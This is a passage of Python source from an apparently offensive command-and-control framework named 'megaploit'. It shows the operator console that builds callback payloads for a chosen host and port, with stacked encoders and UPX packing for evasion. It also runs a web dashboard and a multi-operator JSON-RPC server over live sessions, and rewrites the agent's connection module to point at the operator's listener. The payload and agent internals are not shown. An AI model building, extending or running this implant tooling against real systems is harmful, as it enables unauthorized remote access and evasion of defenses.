                if enc not in _ENCODERS:
                    print(err(f"  Unknown encoder: {enc}  (try: payload help)"))
                    return
                encoders.append(enc); i += 2
            else:
                i += 1

        try:
            from megaploit.payload.builder import BuildConfig, OutputFormat
            fmt = OutputFormat(fmt_str)
        except ValueError:
            print(err(f"  Unknown format: {_c(fmt_str, _BOLD)}  (try: payload help)"))
            return

        from megaploit.payload.builder import BuildConfig
        cfg = BuildConfig(
            lhost=self.lhost,
            lport=self.port,
            format=fmt,
            use_tls=use_tls,
            secret_key=self.secret_key,
            output_path=out_path,
            encoders=encoders,
            upx_pack=upx_pack,
        )

        print(info(f"  Building {_c(fmt_str, _CYAN)} payload…"))
        result = _payload_builder.build(cfg)

        if not result.ok:
            print(err(f"  Build failed: {result.error}"))
            return

        if out_path:
            print(ok(f"  {_c(out_path, _CYAN)}  sha256={_c(result.sha256[:16], _GREY)}…  "
                     f"{_c(f'{result.size:,} bytes', _DIM)}"))
        else:
            print()
            print(_rule("─", width=60, color=_CYAN))
            print(result.data.decode(errors="replace"))
            print(_rule("─", width=60, color=_CYAN))
            print()
        print(ok(f"  Built in {result.build_time_s:.2f}s"))

    # ---------------------------------------------------------------
    # Web dashboard command
    # ---------------------------------------------------------------

    def _cmd_web(self, args: list[str]) -> None:
        """web start [--port N] [--host H] | web stop | web status"""
        sub  = args[0].lower() if args else "status"
        rest = args[1:]

        if sub == "start":
            port = 8080
            host = "127.0.0.1"
            i = 0
            while i < len(rest):
                if rest[i] in ("--port", "-p") and i + 1 < len(rest):
                    port = int(rest[i + 1]); i += 2
                elif rest[i] in ("--host", "-H") and i + 1 < len(rest):
                    host = rest[i + 1]; i += 2
                else:
                    i += 1
            if getattr(self, "_web_server", None) and self._web_server.is_running():
                print(warn(f"  Web dashboard already running — {self._web_server.url()}"))
                return
            try:
                from megaploit.web.app import WebServer
                fp = key_fingerprint(self.secret_key)
                self._web_server = WebServer(
                    sessions_ref=self._sessions,
                    sessions_lock=self._sessions_lock,
                    port=port,
                    host=host,
                    api_key=fp[:16],
                )
                self._web_server.start()
                print(ok(f"  Web dashboard started:  {_c(self._web_server.url(), _CYAN)}"))
                print(info(f"  API key (X-API-Key header):  {_c(fp[:16], _YELLOW)}"))
            except ImportError as exc:
                print(err(f"  Flask not installed:  pip install flask\n  {exc}"))

        elif sub == "stop":
            ws = getattr(self, "_web_server", None)
            if ws and ws.is_running():
                print(ok("  Web dashboard stopped."))
                self._web_server = None
            else:
                print(warn("  Web dashboard is not running."))

        elif sub == "status":
            ws = getattr(self, "_web_server", None)
            if ws and ws.is_running():
                print(ok(f"  Web dashboard running:  {_c(ws.url(), _CYAN)}"))
            else:
                print(info("  Web dashboard not started.  Run:  web start"))
        else:
            print(info("  Usage: web [start [--port N] [--host H] | stop | status]"))

    # ---------------------------------------------------------------
    # RPC server command
    # ---------------------------------------------------------------

    def _cmd_rpc(self, args: list[str]) -> None:
        """rpc start [--port N] [--host H] | rpc stop | rpc status | rpc operators"""
        sub  = args[0].lower() if args else "status"
        rest = args[1:]

        if sub == "start":
            port = 7777
            host = "127.0.0.1"
            i = 0
            while i < len(rest):
                if rest[i] in ("--port", "-p") and i + 1 < len(rest):
                    port = int(rest[i + 1]); i += 2
                elif rest[i] in ("--host", "-H") and i + 1 < len(rest):
                    host = rest[i + 1]; i += 2
                else:
                    i += 1
            if getattr(self, "_rpc_server", None) and self._rpc_server._running:
                print(warn(f"  RPC server already running on {host}:{port}"))
                return
            try:
                from megaploit.web.rpc import RpcServer
                fp = key_fingerprint(self.secret_key)
                self._rpc_server = RpcServer(
                    sessions_ref=self._sessions,
                    sessions_lock=self._sessions_lock,
                    host=host,
                    port=port,
                    api_key=fp[:16],
                )
                self._rpc_server.start()
                print(ok(f"  RPC server started on {_c(f'{host}:{port}', _CYAN)}"))
                print(info(f"  API key:  {_c(fp[:16], _YELLOW)}"))
                print(info(f"  Connect with any JSON-RPC 2.0 client over TCP."))
            except Exception as exc:
                print(err(f"  RPC start failed: {exc}"))

        elif sub == "stop":
            rpc = getattr(self, "_rpc_server", None)
            if rpc and rpc._running:
                rpc.stop()
                print(ok("  RPC server stopped."))
            else:
                print(warn("  RPC server not running."))

        elif sub == "operators":
            rpc = getattr(self, "_rpc_server", None)
            if not rpc or not rpc._running:
                print(warn("  RPC server not running."))
                return
            with rpc._op_lock:
                ops = list(rpc._operators.values())
            if not ops:
                print(info("  No operators connected."))
            else:
                print()
                for op in ops:
                    status = _c("authed", _GREEN) if op.auth_ok else _c("pending", _YELLOW)
                    print(f"  {_c(op.name, _CYAN):<{20+9}}  {op.addr[0]}  {status}")
                print()

        elif sub == "status":
            rpc = getattr(self, "_rpc_server", None)
            if rpc and rpc._running:
                print(ok(f"  RPC server running on {_c(f'{rpc._host}:{rpc._port}', _CYAN)}  "
                          f"({len(rpc._operators)} operator(s) connected)"))
            else:
                print(info("  RPC server not started.  Run:  rpc start"))
        else:
            print(info("  Usage: rpc [start [--port N] [--host H] | stop | status | operators]"))



    # ---------------------------------------------------------------
    # Settings persistence
    # ---------------------------------------------------------------

    def _save_settings_to_disk(self) -> None:
        """Write current runtime settings to ~/.megaploit.json."""
        self._settings.update({
            "lhost":           self.lhost,
            "port":            self.port,
            "auto_update":     self.auto_update,
            "watcher":         self._watcher_enabled,
            "engagement_name": self.engagement_name,
            "engagement_desc": self.engagement_desc,
            "aliases":         self._aliases,
        })
        save_settings(self._settings)

    # ---------------------------------------------------------------
    # Shutdown
    # ---------------------------------------------------------------

    def _shutdown(self) -> None:
        print()
        print(_rule("─", color=_RED))
        print(info("Shutting down…"))
        if self._updater:
            self._updater.stop()
        if self._listener:
            self._listener.stop()
        with self._sessions_lock:
            for sess in self._sessions.values():
                sess.close()
        print(ok("Goodbye."))
        print(_rule("─", color=_RED))


# ---------------------------------------------------------------------------
# Options display helper
# ---------------------------------------------------------------------------

def _show_options(console: Console) -> None:
    print()
    print(_c(f"  {'Option':<16}  Value", _BOLD, _WHITE))
    print(_rule("─", width=50))
    for key, val in (
        ("lhost",          console.lhost or "(not set)"),
        ("port",           str(console.port)),
        ("cert",           console.cert or "(none)"),
        ("key",            console.key_file or "(none)"),
        ("auto_update",    "on" if console.auto_update else "off"),
        ("engagement",     console.engagement_name or "(not set)"),
    ):
        val_col = _c(val, _WHITE) if val not in ("(not set)", "(none)", "off") else _c(val, _DIM)
        print(f"  {_c(key, _YELLOW):<{16 + 9}}  {val_col}")
    print()


# ---------------------------------------------------------------------------
# Agent patcher
# ---------------------------------------------------------------------------

def _patch_agent(lhost: str, port: int, use_tls: bool = False) -> None:
    _patch_connection_module(lhost, port, use_tls)
    print(ok(f"agent.py patched  —  LHOST={_c(lhost, _CYAN)}  PORT={_c(str(port), _CYAN)}  TLS={_c(str(use_tls), _CYAN)}"))


def _patch_connection_module(lhost: str, port: int, use_tls: bool) -> None:
    path = os.path.join("megaploit", "agent", "connection.py")
    try:
        with open(path, "r", encoding="utf-8") as f:
            src = f.read()
        src = re.sub(r'^LHOST\s*=.*$',   f'LHOST   = "{lhost}"',             src, flags=re.MULTILINE)
        src = re.sub(r'^PORT\s*=.*$',    f'PORT    = {port}',                src, flags=re.MULTILINE)
        src = re.sub(r'^USE_TLS\s*=.*$', f'USE_TLS = {use_tls}   # patched', src, flags=re.MULTILINE)
        with open(path, "w", encoding="utf-8") as f:
            f.write(src)
    except IOError as e:
        print(err(f"Patch failed: {e}"))
